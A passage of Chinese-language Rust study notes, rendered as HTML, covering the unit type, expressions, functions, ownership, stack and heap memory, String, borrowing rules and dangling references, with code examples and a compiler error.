class-name\">Complex</span> <span class=\"token punctuation\">&#123;</span> re<span class=\"token punctuation\">:</span> <span class=\"token number\">2.1</span><span class=\"token punctuation\">,</span> im<span class=\"token punctuation\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">1.2</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">let</span> b <span class=\"token operator\">=</span> <span class=\"token class-name\">Complex</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token number\">11.1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125; + &#123;&#125;i\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>结果：</p>\n<pre><code>13.2 + 21i\n</code></pre>\n<h4 id=\"字符布尔单元类型\"><a class=\"anchor\" href=\"#字符布尔单元类型\">#</a> 字符，布尔，单元类型：</h4>\n<p>单元类型：</p>\n<p>单元类型就是  <code>()</code>  ，对，你没看错，就是  <code>()</code>  ，唯一的值也是  <code>()</code>  ，一些读者读到这里可能就不愿意了，你也太敷衍了吧，管这叫类型？</p>\n<p>只能说，再不起眼的东西，都有其用途，在目前为止的学习过程中，大家已经看到过很多次  <code>fn main()</code>  函数的使用吧？那么这个函数返回什么呢？</p>\n<p>没错，  <code>main</code>  函数就返回这个单元类型  <code>()</code> ，你不能说  <code>main</code>  函数无返回值，因为没有返回值的函数在 Rust 中是有单独的定义的： <code>发散函数( diverge function )</code> ，顾名思义，无法收敛的函数。</p>\n<p>例如常见的  <code>println!()</code>  的返回值也是单元类型  <code>()</code> 。</p>\n<p>再比如，你可以用  <code>()</code>  作为  <code>map</code>  的值，表示我们不关注具体的值，只关注  <code>key</code> 。 这种用法和 Go 语言的 <em><strong>struct{}</strong></em> 类似，可以作为一个值用来占位，但是完全<strong>不占用</strong>任何内存。</p>\n<h4 id=\"语句与表达式\"><a class=\"anchor\" href=\"#语句与表达式\">#</a> 语句与表达式：</h4>\n<p>表达式会进行求值，然后返回一个值。例如  <code>5 + 6</code> ，在求值后，返回值  <code>11</code> ，因此它就是一条表达式。</p>\n<p>表达式可以成为语句的一部分，例如  <code>let y = 6</code>  中， <code>6</code>  就是一个表达式，它在求值后返回一个值  <code>6</code> （有些反直觉，但是确实是表达式）。</p>\n<p>调用一个函数是表达式，因为会返回一个值，调用宏也是表达式，用花括号包裹最终返回一个值的语句块也是表达式，总之，能返回值，它就是表达式:</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">let</span> x  <span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span>x<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value o y is:&#123;&#125;\"</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>语句块：</p>\n<pre><code>&#123;\nlet x  =3;\nx+1\n&#125;\n</code></pre>\n<p>这里的 x+1 就是返回的值</p>\n<p>若在表达式里面加上；就是代表不会返回值</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ret_unit_type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">ret_unit_type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">//if 语句块也是一个表达式，因此可以用于赋值，也可以直接返回</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// 类似三元运算符，在 Rust 里我们可以这样写</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> x <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token string\">\"odd\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token string\">\"even\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 或者写成一行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">let</span> z <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> x <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"odd\"</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"even\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"函数\"><a class=\"anchor\" href=\"#函数\">#</a> 函数：</h2>\n<p>例子：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">:</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">:</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">-></span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i<span class=\"token operator\">+</span>j</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503282040120.png\" alt=\"image-20250328204037066\" /></p>\n<h3 id=\"所有权与借用\"><a class=\"anchor\" href=\"#所有权与借用\">#</a> 所有权与借用：</h3>\n<h4 id=\"所有权\"><a class=\"anchor\" href=\"#所有权\">#</a> 所有权：</h4>\n<p>所有的程序都必须和计算机内存打交道，如何从内存中申请空间来存放程序的运行内容，如何在不需要的时候释放这些空间，成了重中之重，也是所有编程语言设计的难点之一。在计算机语言不断演变过程中，出现了三种流派：</p>\n<ul>\n<li><strong>垃圾回收机制 (GC)</strong>，在程序运行时不断寻找不再使用的内存，典型代表：Java、Go</li>\n<li><strong>手动管理内存的分配和释放</strong>，在程序中，通过函数调用的方式来申请和释放内存，典型代表：C++</li>\n<li><strong>通过所有权来管理内存</strong>，编译器在编译时会根据一系列规则进行检查</li>\n</ul>\n<p>其中 Rust 选择了第三种，最妙的是，这种检查只发生在编译期，因此对于程序运行期，不会有任何性能上的损失。</p>\n<p>由于所有权是一个新概念，因此读者需要花费一些时间来掌握它，一旦掌握，海阔天空任你飞跃，在本章，我们将通过  <code>字符串</code>  来引导讲解所有权的相关知识。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span>          <span class=\"token comment\">// 变量 a 的作用域开始</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token string\">\"xyz\"</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 变量 c 的作用域开始</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span>                   <span class=\"token comment\">// 变量 a 和 c 的作用域结束</span></pre></td></tr></table></figure><p>这段代码虽然可以编译通过，但是其实非常糟糕，变量 a 是在函数内进行的定义分配的内存，现在我返回这个的指针，但是我分配时在这个函数块里面，这样的话过了这个函数 a 就会被自动释放，这个 a 变量的指针会被释放无效，或是被其他的函数调用或局部变量覆盖，从而造成了  <code>悬空指针(Dangling Pointer)</code>  的问题。这是一个非常典型的内存安全问题，虽然编译可以通过，但是运行的时候会出现错误，很多编程语言都存在。</p>\n<p>再来看变量  <code>c</code> ， <code>c</code>  的值是常量字符串，存储于常量区，可能这个函数我们只调用了一次，也可能我们不再会使用这个字符串，但  <code>&quot;xyz&quot;</code>  只有当整个程序结束后系统才能回收这片内存。</p>\n<p>所以内存安全问题，一直都是程序员非常头疼的问题，好在，在 Rust 中这些问题即将成为历史，因为 Rust 在编译的时候就可以帮助我们发现内存不安全的问题，那 Rust 如何做到这一点呢？</p>\n<p>在正式进入主题前，先来一个预热知识。</p>\n<h5 id=\"栈与堆\"><a class=\"anchor\" href=\"#栈与堆\">#</a> 栈与堆：</h5>\n<p>栈和堆的核心目标就是</p>\n<p>为程序在运行时提供可供使用的内存空间。</p>\n<h6 id=\"栈\"><a class=\"anchor\" href=\"#栈\">#</a> 栈：</h6>\n<p>（栈中的数据必须是占用已知且固定大小的内存空间）先进后出，加数据是进栈，移出数据叫出栈</p>\n<h6 id=\"堆\"><a class=\"anchor\" href=\"#堆\">#</a> 堆：</h6>\n<p>（堆中的数据都是大小未知或者可能变化的数据）</p>\n<p>当向堆上放入数据时，需要请求一定大小的内存空间。操作系统在堆的某处找到一块足够大的空位，把它标记为已使用，并返回一个表示该位置地址的<strong>指针</strong>，该过程被称为<strong>在堆上分配内存</strong>，有时简称为 “分配”(allocating)。</p>\n<p>接着该指针会被<strong>推入栈中</strong>中，因为指针的大小是一直且固定的，后续使用过程中可以通过这个指针访问堆来访问这指针对应的数据</p>\n<h6 id=\"性能区别\"><a class=\"anchor\" href=\"#性能区别\">#</a> 性能区别：</h6>\n<pre><code>在栈上分配内存比在堆上分配内存要快，因为入栈时操作系统无需进行函数调用（或更慢的系统调用）来分配新的空间，只需要将新数据放入栈顶即可。相比之下，在堆上分配内存则需要更多的工作，这是因为操作系统必须首先找到一块足够存放数据的内存空间，接着做一些记录为下一次分配做准备，如果当前进程分配的内存页不足时，还需要进行系统调用来申请更多内存。 因此，处理器在栈上分配数据会比在堆上分配数据更加高效。\n</code></pre>\n<h6 id=\"所有权与堆栈\"><a class=\"anchor\" href=\"#所有权与堆栈\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvb3duZXJzaGlwL293bmVyc2hpcC5odG1sIyVFNiU4OSU4MCVFNiU5QyU4OSVFNiU5RCU4MyVFNCVCOCU4RSVFNSVBMCU4NiVFNiVBMCU4OA==\">所有权与堆栈</span></h6>\n<p>当你的代码调用一个函数时，传递给函数的参数（包括可能指向堆上数据的指针和函数的局部变量）依次被压入栈中，当函数调用结束时，这些值将被从栈中按照相反的顺序依次移除。</p>\n<p>因为堆上的数据缺乏组织，因此跟踪这些数据何时分配和释放是非常重要的，否则堆上的数据将产生内存泄漏 —— 这些数据将永远无法被回收。这就是 Rust 所有权系统为我们提供的强大保障。</p>\n<p>对于其他很多编程语言，你确实无需理解堆栈的原理，但是<strong>在 Rust 中，明白堆栈的原理，对于我们理解所有权的工作原理会有很大的帮助</strong>。</p>\n<h5 id=\"所有权原则\"><a class=\"anchor\" href=\"#所有权原则\">#</a> 所有权原则：</h5>\n<p>规则：</p>\n<pre><code>1.rust中每一个值都被一个变量所拥有，该变量被称为值的所有这\n2.一个值同时只能被一个变量所拥有，或者说一个值只能拥有一个所有者\n3.当所有者（变量）离开作用域范围时，这个值将被丢弃（drop）\n</code></pre>\n<p>例如字符串：</p>\n<p>之前的语言都是直接给一个字符串值，但是不能改变了，这中叫做是被硬编码进程序里的字符串值（类型为 &amp; str）</p>\n<p>又两个缺点：</p>\n<p>不能变，不是什么时候都是可以在编写代码时后就可以得知的</p>\n<p>所以，rust 提供动态字符串类型：String, 该类型被分配到堆上，因此可以动态伸缩，也就能存储在编译时大小位置的文本</p>\n<p>可以用下面的方法基于字符串字面量来创建 String 类型：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>:: 是一种调用操作符，这里表示调用 String 类型中的 from 关联函数，由于 String 类型存储在堆上，因此它是动态的，可以修改：</p>\n<pre><code>let mut s =String::from(&quot;hello &quot;);\ns.push_str(&quot;,world&quot;);\nprintln!(&quot;&#123;&#125;&quot;,s);\n</code></pre>\n<p>用 push_str 函数就可以加进去了</p>\n<h6 id=\"变量绑定背后的数据交互\"><a class=\"anchor\" href=\"#变量绑定背后的数据交互\">#</a> 变量绑定背后的数据交互：</h6>\n<pre><code>let s1= String::from(&quot;hello&quot;);\nlet s2=s1;\n</code></pre>\n<p>String 类型是一个复杂类型，又存储在栈中的堆指针，字符串长度，字符串容量，其中堆指针是最重要的，容量是堆内存分配空间的大小，长度是目前已经使用的大小。</p>\n<p>Rust 这样解决问题：<strong>当  <code>s1</code>  被赋予  <code>s2</code>  后，Rust 认为  <code>s1</code>  不再有效，因此也无需在  <code>s1</code>  离开作用域后  <code>drop</code>  任何东西，这就是把所有权从  <code>s1</code>  转移给了  <code>s2</code> ， <code>s1</code>  在被赋予  <code>s2</code>  后就马上失效了</strong>。</p>\n<p>s1 的引用便会无效了</p>\n<p>这样就解决了我们之前的问题， <code>s1</code>  不再指向任何数据，只有  <code>s2</code>  是有效的，当  <code>s2</code>  离开作用域，它就会释放内存。 相信此刻，你应该明白了，为什么 Rust 称呼  <code>let a = b</code>  为<strong>变量绑定</strong>了吧？</p>\n<h4 id=\"引用与解引用\"><a class=\"anchor\" href=\"#引用与解引用\">#</a> 引用与解引用</h4>\n<h6 id=\"不可变引用\"><a class=\"anchor\" href=\"#不可变引用\">#</a> 不可变引用：</h6>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s1 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> len <span class=\"token operator\">=</span> <span class=\"token function\">calculate_length</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The length of '&#123;&#125;' is &#123;&#125;.\"</span><span class=\"token punctuation\">,</span> s1<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">calculate_length</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">usize</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>这个函数fn calculate_length(s: &amp;String) -&gt; usize &#123;\n    s.len()\n&#125;我没有对这个函数进行任何操作，所以什么也不会发生\n</code></pre>\n<p>但是有时候我们有需要对引用进来的值进行操作</p>\n<p>这时候就要用 mut 来可变一下了</p>\n<h6 id=\"可变引用\"><a class=\"anchor\" href=\"#可变引用\">#</a> 可变引用：</h6>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">change</span><span class=\"token punctuation\">(</span>some_string<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    some_string<span class=\"token punctuation\">.</span><span class=\"token function\">push_str</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h6 id=\"这两者的区别与联系\"><a class=\"anchor\" href=\"#这两者的区别与联系\">#</a> 这两者的区别与联系:</h6>\n<pre><code>1.可变引用只能在一个作用域里面有一个\n2.可变引用与不可变引用只能有一个\n3.只有不可变引用时，可以有多个不可变引用\n</code></pre>\n<h3 id=\"悬垂引用dangling-references\"><a class=\"anchor\" href=\"#悬垂引用dangling-references\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvb3duZXJzaGlwL2JvcnJvd2luZy5odG1sIyVFNiU4MiVBQyVFNSU5RSU4MiVFNSVCQyU5NSVFNyU5NCVBOGRhbmdsaW5nLXJlZmVyZW5jZXM=\">悬垂引用 (Dangling References)</span></h3>\n<p>悬垂引用也叫做悬垂指针，意思为指针指向某个值后，这个值被释放掉了，而指针仍然存在，其指向的内存可能不存在任何值或已被其它变量重新使用。在 Rust 中编译器可以确保引用永远也不会变成悬垂状态：当你获取数据的引用后，编译器可以确保数据不会在引用结束前被释放，要想释放数据，必须先停止其引用的使用。</p>\n<p>让我们尝试创建一个悬垂引用，Rust 会抛出一个编译时错误：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> reference_to_nothing <span class=\"token operator\">=</span> <span class=\"token function\">dangle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">dangle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token operator\">&amp;</span>s</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里是错误：</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>error[E0106]: missing lifetime specifier</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> --> src/main.rs:5:16</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  |</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>5 | fn dangle() -> &amp;String &#123;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  |                ^ expected named lifetime parameter</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  |</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  = help: this function's return type contains a borrowed value, but there is no value for it to be borrowed from</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>help: consider using the `'static` lifetime</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  |</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>5 | fn dangle() -> &amp;'static String &#123;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  |                ~~~~~~~~</pre></td></tr></table></figure><p>错误信息引用了一个我们还未介绍的功能：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvbGlmZXRpbWUuaHRtbA==\">生命周期 (lifetimes)</span>。不过，即使你不理解生命周期，也可以通过错误信息知道这段代码错误的关键信息：</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>this function's return type contains a borrowed value, but there is no value for it to be borrowed from.</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>该函数返回了一个借用的值，但是已经找不到它所借用值的来源</pre></td></tr></table></figure><p>仔细看看  <code>dangle</code>  代码的每一步到底发生了什么：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">dangle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//dangle 返回一个字符串的引用</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//s 是一个新字符串</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">&amp;</span>s <span class=\"token comment\">// 返回字符串 s 的引用</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 这里 s 离开作用域并被丢弃。其内存被释放。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">// 危险！</span></pre></td></tr></table></figure><p>因为  <code>s</code>  是在  <code>dangle</code>  函数内创建的，当  <code>dangle</code>  的代码执行完毕后， <code>s</code>  将被释放，但是此时我们又尝试去返回它的引用。这意味着这个引用会指向一个无效的  <code>String</code> ，这可不对！</p>\n<p>其中一个很好的解决方法是直接返回  <code>String</code> ：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">no_dangle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这样就没有任何错误了，最终  <code>String</code>  的 <strong>所有权被转移给外面的调用者</strong>。</p>\n<h6 id=\"借用规则总结\"><a class=\"anchor\" href=\"#借用规则总结\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvb3duZXJzaGlwL2JvcnJvd2luZy5odG1sIyVFNSU4MCU5RiVFNyU5NCVBOCVFOCVBNyU4NCVFNSU4OCU5OSVFNiU4MCVCQiVFNyVCQiU5Mw==\">借用规则总结</span></h6>\n<ul>\n<li>\n<pre><code>总的来说，借用规则如下：\n\n- 同一时刻，你只能拥有要么一个可变引用，要么任意多个不可变引用\n- 引用必须总是有效的\n</code></pre>\n</li>\n</ul>\n<h3 id=\"复合类型\"><a class=\"anchor\" href=\"#复合类型\">#</a> 